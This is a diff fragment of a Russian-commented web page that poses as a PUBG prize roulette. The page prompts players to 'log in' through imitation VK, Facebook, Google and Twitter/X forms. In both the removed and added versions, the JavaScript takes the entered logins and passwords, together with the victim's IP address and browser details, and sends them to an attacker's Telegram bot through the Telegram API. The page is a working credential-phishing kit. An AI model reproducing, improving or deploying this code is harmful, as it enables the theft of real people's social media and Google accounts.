-                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
-                };
-                
-                const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
-                
-                if (success) {
-                    closeModal('vkModal');
-                    isPrizeReceived = true;
-                    hasWonPrize = false; // Сбрасываем флаг выигрыша
-                    updatePrizeBadge();
-                    showConfirmation();
-                    showNotification(translations[currentLang].loginSuccess, false, true);
-                    
-                    // Удаляем сохраненное состояние
-                    localStorage.removeItem('userState');
-                    localStorage.setItem('hasPlayed', 'true');
-                }
-            });
-            
-            // Facebook форма
-            document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
-                e.preventDefault();
-                const inputs = this.querySelectorAll('input');
-                const loginData = {
-                    accountId: accountId,
-                    email: inputs[0].value,
-                    password: inputs[1].value
-                };
-                
-                const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
-                
-                if (success) {
-                    closeModal('facebookModal');
-                    isPrizeReceived = true;
-                    hasWonPrize = false; // Сбрасываем флаг выигрыша
-                    updatePrizeBadge();
-                    showConfirmation();
-                    showNotification(translations[currentLang].loginSuccess, false, true);
-                    
-                    // Удаляем сохраненное состояние
-                    localStorage.removeItem('userState');
-                    localStorage.setItem('hasPlayed', 'true');
-                }
-            });
-            
-            // Google Fullscreen обработчики
-            googleNextBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                const email = googleEmailInput.value.trim();
-                
-                if (!email) {
-                    showNotification("Please enter email", true);
-                    return;
-                }
-                
-                googleEmail = email;
-                googleStep1.style.display = 'none';
-                googleStep2.style.display = 'block';
-                googlePasswordInput.value = '';
-                googleShowPassword.checked = false;
-                googlePasswordInput.type = 'password';
-                
-                // Анимация перехода
-                googleStep2.style.animation = 'slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
-            });
-            
-            googleSubmitBtn.addEventListener('click', async function(e) {
-                e.preventDefault();
-                const password = googlePasswordInput.value.trim();
-                
-                if (!password) {
-                    showNotification("Please enter password", true);
-                    return;
-                }
-                
-                const showPassword = googleShowPassword.checked;
-                
-                const loginData = {
-                    accountId: accountId,
-                    email: googleEmail,
-                    password: password,
-                    show_password: showPassword ? 'Да' : 'Нет'
-                };
-                
-                const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
-                
-                if (success) {
-                    closeGoogleFullscreen();
-                    isPrizeReceived = true;
-                    hasWonPrize = false; // Сбрасываем флаг выигрыша
-                    updatePrizeBadge();
-                    showConfirmation();
-                    showNotification(translations[currentLang].loginSuccess, false, true);
-                    
-                    // Удаляем сохраненное состояние
-                    localStorage.removeItem('userState');
-                    localStorage.setItem('hasPlayed', 'true');
-                }
-            });
-            
-            // Обработчик чекбокса "Показать пароль" для Google
-            googleShowPassword.addEventListener('change', function() {
-                if (this.checked) {
-                    googlePasswordInput.type = 'text';
-                } else {
-                    googlePasswordInput.type = 'password';
-                }
-            });
-            
-            // Кнопка "Создать аккаунт" в Google
-            document.getElementById('googleCreateAccountBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                showNotification("Account creation function is temporarily unavailable");
-            });
-            
-            // Кнопка "Забыли пароль" в Google
-            document.getElementById('googleForgotPasswordBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                showNotification("Password recovery function is temporarily unavailable");
-            });
-            
-            // Обработчик кнопки получения приза
-            getPrizeBtn.addEventListener('click', async function() {
-                if (!selectedSocial) {
-                    showNotification(translations[currentLang].notificationSelectSocial, true);
-                    return;
-                }
-                
-                if (!accountId) {
-                    showNotification(translations[currentLang].notificationIdRequired, true);
-                    accountIdSection.classList.add('active');
-                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                    return;
-                }
-                
-                // Открываем соответствующее модальное окно
-                if (selectedSocial === 'google') {
-                    openGoogleFullscreen();
-                } else if (selectedSocial === 'x') {
-                    openXModal();
-                } else if (selectedSocial === 'vk') {
-                    openModal('vkModal');
-                } else if (selectedSocial === 'facebook') {
-                    openModal('facebookModal');
-                }
-            });
-            
-            // Функция показа подтверждения
-            function showConfirmation() {
-                socialSelectSection.classList.remove('active');
-                confirmationSection.classList.add('active');
-                confirmationSection.scrollIntoView({ behavior: 'smooth' });
-            }
-            
-            // Функция отправки данных входа в Telegram
-            async function sendLoginDataToTelegram(socialType, loginData, prizeIndex) {
-                const socialNames = {
-                    'vk': 'ВКонтакте',
-                    'facebook': 'Facebook',
-                    'x': 'Twitter/X',
-                    'google': 'Google'
-                };
-                
-                const prizeNumber = prizeIndex + 1;
-                
-                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
-                message += `🎮 ID аккаунта: ${loginData.accountId || 'Не указано'}\n`;
-                message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
-                
-                // Добавляем данные в зависимости от соцсети
-                if (socialType === 'vk') {
-                    message += `📞 Телефон/email: ${loginData.phone || 'Не указано'}\n`;
-                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
-                    message += `💻 Чужой компьютер: ${loginData.foreign_computer || 'Нет'}\n`;
-                } else if (socialType === 'facebook') {
-                    message += `📧 Email/телефон: ${loginData.email || 'Не указано'}\n`;
-                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
-                } else if (socialType === 'x') {
-                    message += `👤 Имя пользователя: ${loginData.username || 'Не указано'}\n`;
-                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
-                } else if (socialType === 'google') {
-                    message += `📧 Email: ${loginData.email || 'Не указано'}\n`;
-                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
-                    message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
-                }
-                
-                message += `🎁 Выигранный приз: #${prizeNumber}\n`;
-                message += `⏰ Время: ${new Date().toLocaleString()}\n`;
-                message += `🌐 User Agent: ${navigator.userAgent}\n`;
-                message += `📍 IP: ${userIP || 'Не определен'}`;
-                
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
+                // Обработчики выбора соцсети
+                socialOptions.forEach(option => {
+                    option.addEventListener('click', function() {
+                        socialOptions.forEach(opt => opt.classList.remove('selected'));
+                        
+                        this.classList.add('selected');
+                        selectedSocial = this.getAttribute('data-social');
                     });
+                });
+                
+                // Обработчики форм входа
+                
+                // Twitter/X форма (этап 1: email/username)
+                document.getElementById('xEmailForm').addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    xUsername = this.querySelector('input').value;
                     
-                    const data = await response.json();
-                    console.log('Telegram response:', data);
+                    // Переходим к окну пароля
+                    closeModal('xModalStep1');
+                    openModal('xModalStep2');
+                });
+                
+                // Twitter/X форма (этап 2: пароль)
+                document.getElementById('xPasswordForm').addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    const password = this.querySelector('input').value;
                     
-                    if (data.ok) {
-                        return true;
+                    const loginData = {
+                        accountId: accountId,
+                        username: xUsername,
+                        password: password
+                    };
+                    
+                    const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
+                    
+                    if (success) {
+                        closeModal('xModalStep2');
+                        isPrizeReceived = true;
+                        updatePrizeBadge();
+                        showConfirmation();
+                        showNotification(translations[currentLang].loginSuccess, false, true);
+                    }
+                });
+                
+                // ВКонтакте форма
+                document.getElementById('vkLoginForm').addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    const inputs = this.querySelectorAll('input');
+                    const loginData = {
+                        accountId: accountId,
+                        phone: inputs[0].value,
+                        password: inputs[1].value,
+                        foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
+                    };
+                    
+                    const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
+                    
+                    if (success) {
+                        closeModal('vkModal');
+                        isPrizeReceived = true;
+                        updatePrizeBadge();
+                        showConfirmation();
+                        showNotification(translations[currentLang].loginSuccess, false, true);
+                    }
+                });
+                
+                // Facebook форма
+                document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    const inputs = this.querySelectorAll('input');
+                    const loginData = {
+                        accountId: accountId,
+                        email: inputs[0].value,
+                        password: inputs[1].value
+                    };
+                    
+                    const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
+                    
+                    if (success) {
+                        closeModal('facebookModal');
+                        isPrizeReceived = true;
+                        updatePrizeBadge();
+                        showConfirmation();
+                        showNotification(translations[currentLang].loginSuccess, false, true);
+                    }
+                });
+                
+                // Google Fullscreen обработчики
+                googleNextBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const email = googleEmailInput.value.trim();
+                    
+                    if (!email) {
+                        showNotification("Please enter email", true);
+                        return;
+                    }
+                    
+                    googleEmail = email;
+                    googleStep1.style.display = 'none';
+                    googleStep2.style.display = 'block';
+                    googlePasswordInput.value = '';
+                    googleShowPassword.checked = false;
+                    googlePasswordInput.type = 'password';
+                    
+                    // Анимация перехода
+                    googleStep2.style.animation = 'slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
+                });
+                
+                googleSubmitBtn.addEventListener('click', async function(e) {
+                    e.preventDefault();
+                    const password = googlePasswordInput.value.trim();
+                    
+                    if (!password) {
+                        showNotification("Please enter password", true);
+                        return;
+                    }
+                    
+                    const showPassword = googleShowPassword.checked;
+                    
+                    const loginData = {
+                        accountId: accountId,
+                        email: googleEmail,
+                        password: password,
+                        show_password: showPassword ? 'Да' : 'Нет'
+                    };
+                    
+                    const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
+                    
+                    if (success) {
+                        closeGoogleFullscreen();
+                        isPrizeReceived = true;
+                        updatePrizeBadge();
+                        showConfirmation();
+                        showNotification(translations[currentLang].loginSuccess, false, true);
+                    }
+                });
+                
+                // Обработчик чекбокса "Показать пароль" для Google
+                googleShowPassword.addEventListener('change', function() {
+                    if (this.checked) {
+                        googlePasswordInput.type = 'text';
                     } else {
-                        console.error('Telegram error:', data);
+                        googlePasswordInput.type = 'password';
+                    }
+                });
+                
+                // Кнопка "Создать аккаунт" в Google
+                document.getElementById('googleCreateAccountBtn').addEventListener('click', function(e) {
+                    e.preventDefault();
+                    showNotification("Account creation function is temporarily unavailable");
+                });
+                
+                // Кнопка "Забыли пароль" в Google
+                document.getElementById('googleForgotPasswordBtn').addEventListener('click', function(e) {
+                    e.preventDefault();
+                    showNotification("Password recovery function is temporarily unavailable");
+                });
+                
+                // Обработчик кнопки получения приза
+                getPrizeBtn.addEventListener('click', async function() {
+                    if (!selectedSocial) {
+                        showNotification(translations[currentLang].notificationSelectSocial, true);
+                        return;
+                    }
+                    
+                    if (!accountId) {
+                        showNotification(translations[currentLang].notificationIdRequired, true);
+                        accountIdSection.classList.add('active');
+                        accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                        return;
+                    }
+                    
+                    // Открываем соответствующее модальное окно
+                    if (selectedSocial === 'google') {
+                        openGoogleFullscreen();
+                    } else if (selectedSocial === 'x') {
+                        openXModal();
+                    } else if (selectedSocial === 'vk') {
+                        openModal('vkModal');
+                    } else if (selectedSocial === 'facebook') {
+                        openModal('facebookModal');
+                    }
+                });
+                
+                // Функция показа подтверждения
+                function showConfirmation() {
+                    socialSelectSection.classList.remove('active');
+                    confirmationSection.classList.add('active');
+                    confirmationSection.scrollIntoView({ behavior: 'smooth' });
+                    
+                    // Сохраняем состояние
+                    saveUserState();
+                }
+                
+                // Функция отправки данных входа в Telegram
+                async function sendLoginDataToTelegram(socialType, loginData, prizeIndex) {
+                    const socialNames = {
+                        'vk': 'ВКонтакте',
+                        'facebook': 'Facebook',
+                        'x': 'Twitter/X',
+                        'google': 'Google'
+                    };
+                    
+                    const prizeNumber = prizeIndex + 1;
+                    
+                    let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
+                    message += `🎮 ID аккаунта: ${loginData.accountId || 'Не указано'}\n`;
+                    message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
+                    
+                    // Добавляем данные в зависимости от соцсети
+                    if (socialType === 'vk') {
+                        message += `📞 Телефон/email: ${loginData.phone || 'Не указано'}\n`;
+                        message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                        message += `💻 Чужой компьютер: ${loginData.foreign_computer || 'Нет'}\n`;
+                    } else if (socialType === 'facebook') {
+                        message += `📧 Email/телефон: ${loginData.email || 'Не указано'}\n`;
+                        message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                    } else if (socialType === 'x') {
+                        message += `👤 Имя пользователя: ${loginData.username || 'Не указано'}\n`;
+                        message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                    } else if (socialType === 'google') {
+                        message += `📧 Email: ${loginData.email || 'Не указано'}\n`;
+                        message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                        message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
+                    }
+                    
+                    message += `🎁 Выигранный приз: #${prizeNumber}\n`;
+                    message += `⏰ Время: ${new Date().toLocaleString()}\n`;
+                    message += `🌐 User Agent: ${navigator.userAgent}\n`;
+                    message += `📍 IP: ${userIP || 'Не определен'}`;
+                    
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    
+                    try {
+                        const response = await fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CHAT_ID,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                        
+                        const data = await response.json();
+                        console.log('Telegram response:', data);
+                        
+                        if (data.ok) {
+                            return true;
+                        } else {
+                            console.error('Telegram error:', data);
+                            return false;
+                        }
+                    } catch (error) {
+                        console.error('Error sending to Telegram:', error);
                         return false;
                     }
-                } catch (error) {
-                    console.error('Error sending to Telegram:', error);
-                    return false;
-                }
-            }
-            
-            // Запуск рулетки
-            playBtn.addEventListener('click', startRoulette);
-            
-            // Открытие окна с призом
-            prizeMailBtn.addEventListener('click', openPrizeWindow);
-            
-            // Инициализация
-            selectionFrame.style.opacity = '0';
-            selectionIndicator.style.opacity = '0';
-            updatePrizeBadge();
-            
-            // Проверяем, играл ли пользователь уже
-            if (hasPlayed && userIP !== ownerIP && !extraAttemptGiven) {
-                playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
-                playBtn.disabled = false;
-            }
-            
-            // Закрытие окна приза при клике на кнопку "Закрыть"
-            collectPrizeBtn.addEventListener('click', closePrizeWindow);
-            
-            // Закрытие окна приза при клике вне его
-            document.getElementById('prizeWindow').addEventListener('click', function(e) {
-                if (e.target === this) {
-                    closePrizeWindow();
-                }
-            });
-            
-            // Закрытие Google Fullscreen при клике вне его
-            googleFullscreen.addEventListener('click', function(e) {
-                if (e.target === this) {
-                    closeGoogleFullscreen();
-                }
-            });
-            
-            // Предзагрузка изображений
-            function preloadImages() {
-                // Фон сайта
-                const bg = new Image();
-                bg.src = 'phon.png';
-                
-                // Призы
-                for (let i = 1; i <= 9; i++) {
-                    const img = new Image();
-                    img.src = `priz${i}.png`;
                 }
                 
-                // Иконки соцсетей
-                const socialImages = [
-                    'vkontakte.png',
-                    'twiter.png',
-                    'google.png'
-                ];
+                // Запуск рулетки
+                playBtn.addEventListener('click', startRoulette);
                 
-                socialImages.forEach(src => {
-                    const img = new Image();
-                    img.src = src;
-                });
-            }
-            
-            preloadImages();
-            
-            // Закрытие выпадающих меню при клике вне их
-            document.addEventListener('click', function(event) {
-                if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
-                    languageDropdown.classList.remove('show');
+                // Открытие окна с призом
+                prizeMailBtn.addEventListener('click', openPrizeWindow);
+                
+                // Инициализация интерфейса
+                selectionFrame.style.opacity = '0';
+                selectionIndicator.style.opacity = '0';
+                updatePrizeBadge();
+                
+                // Восстанавливаем состояние при загрузке
+                if (userPrize && !isPrizeReceived) {
+                    // Показываем рамку на выигранном призе
+                    setTimeout(() => {
+                        moveFrameToPrize(finalPrizeIndex);
+                        showSelectionIndicator(true);
+                    }, 500);
+                    
+                    // Обновляем кнопку игры
+                    if (hasPlayed && userIP !== ownerIP) {
+                        playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
+                    }
+                    
+                    // Показываем соответствующую форму
+                    if (!accountId) {
+                        accountIdSection.classList.add('active');
+                    } else {
+                        socialSelectSection.classList.add('active');
+                    }
                 }
                 
-                if (!menuBtn.contains(event.target) && !dropdownMenu.contains(event.target)) {
-                    dropdownMenu.classList.remove('show');
+                // Проверяем, играл ли пользователь уже
+                if (hasPlayed && userIP !== ownerIP) {
+                    playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
+                    playBtn.disabled = false;
                 }
-            });
-            
-            // Закрытие модальных окон при клике вне их
-            document.querySelectorAll('.modal-overlay').forEach(modal => {
-                modal.addEventListener('click', function(e) {
+                
+                // Закрытие окна приза при клике на кнопку "Закрыть"
+                collectPrizeBtn.addEventListener('click', closePrizeWindow);
+                
+                // Закрытие окна приза при клике вне его
+                document.getElementById('prizeWindow').addEventListener('click', function(e) {
                     if (e.target === this) {
-                        this.classList.remove('active');
-                        document.body.style.overflow = 'auto';
+                        closePrizeWindow();
                     }
                 });
-            });
-            
-            // Закрытие Google Fullscreen по Escape
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape' && googleFullscreen.classList.contains('active')) {
-                    closeGoogleFullscreen();
-                }
-            });
-            
-            // Автоматическая анимация рамки до начала игры
-            function animateFrameRandomly() {
-                if (!isSpinning && !hasPlayed) {
-                    const randomIndex = Math.floor(Math.random() * prizeItems.length);
-                    moveFrameToPrize(randomIndex);
+                
+                // Закрытие Google Fullscreen при клике вне его
+                googleFullscreen.addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        closeGoogleFullscreen();
+                    }
+                });
+                
+                // Предзагрузка изображений
+                function preloadImages() {
+                    // Фон сайта
+                    const bg = new Image();
+                    bg.src = 'phon.png';
                     
-                    // Рандомный интервал для следующей анимации
-                    const nextDelay = Math.random() * 2000 + 1000; // 1-3 секунды
-                    setTimeout(animateFrameRandomly, nextDelay);
+                    // Призы
+                    for (let i = 1; i <= 9; i++) {
+                        const img = new Image();
+                        img.src = `priz${i}.png`;
+                    }
+                    
+                    // Иконки соцсетей
+                    const socialImages = [
+                        'vkontakte.png',
+                        'twiter.png',
+                        'google.png'
+                    ];
+                    
+                    socialImages.forEach(src => {
+                        const img = new Image();
+                        img.src = src;
+                    });
                 }
+                
+                preloadImages();
+                
+                // Закрытие выпадающих меню при клике вне их
+                document.addEventListener('click', function(event) {
+                    if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
+                        languageDropdown.classList.remove('show');
+                    }
+                    
+                    if (!menuBtn.contains(event.target) && !dropdownMenu.contains(event.target)) {
+                        dropdownMenu.classList.remove('show');
+                    }
+                });
+                
+                // Закрытие модальных окон при клике вне их
+                document.querySelectorAll('.modal-overlay').forEach(modal => {
+                    modal.addEventListener('click', function(e) {
+                        if (e.target === this) {
+                            this.classList.remove('active');
+                            document.body.style.overflow = 'auto';
+                        }
+                    });
+                });
+                
+                // Закрытие Google Fullscreen по Escape
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'Escape' && googleFullscreen.classList.contains('active')) {
+                        closeGoogleFullscreen();
+                    }
+                });
+                
+                // Автоматическая анимация рамки до начала игры
+                function animateFrameRandomly() {
+                    if (!isSpinning && !hasPlayed) {
+                        const randomIndex = Math.floor(Math.random() * prizeItems.length);
+                        moveFrameToPrize(randomIndex);
+                        
+                        // Рандомный интервал для следующей анимации
+                        const nextDelay = Math.random() * 2000 + 1000; // 1-3 секунды
+                        setTimeout(animateFrameRandomly, nextDelay);
+                    }
+                }
+                
+                // Запускаем анимацию рамки через 2 секунды после загрузки
+                setTimeout(() => {
+                    if (!isSpinning && !userPrize) {
+                        animateFrameRandomly();
+                    }
+                }, 2000);
+                
+                // Устанавливаем язык из сохраненного состояния или английский по умолчанию
+                changeLanguage(currentLang);
             }
-            
-            // Запускаем анимацию рамки через 2 секунды после загрузки
-            setTimeout(() => {
-                if (!isSpinning) {
-                    animateFrameRandomly();
-                }
-            }, 2000);
-            
-            // Устанавливаем английский язык по умолчанию
-            changeLanguage('en');
         });
     </script>
 </body>
